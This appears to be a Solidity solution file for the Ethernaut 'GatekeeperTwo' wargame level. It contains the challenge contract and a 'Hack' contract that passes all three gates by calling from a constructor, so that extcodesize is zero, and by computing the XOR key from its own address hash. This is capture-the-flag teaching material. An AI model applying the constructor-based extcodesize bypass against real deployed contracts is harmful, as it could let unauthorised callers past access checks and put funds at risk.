// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    constructor(address _gateKeeper) {
        // gate one and two are passed by conduction the attack through a contract with no code (conduct attack within constructor)
        GatekeeperTwo gatekeeper = GatekeeperTwo(_gateKeeper);
        // gate three can be calculated
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        uint64 key64 = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        bytes8 key = bytes8(key64 ^ type(uint64).max);
        gatekeeper.enter(key);
    }
}
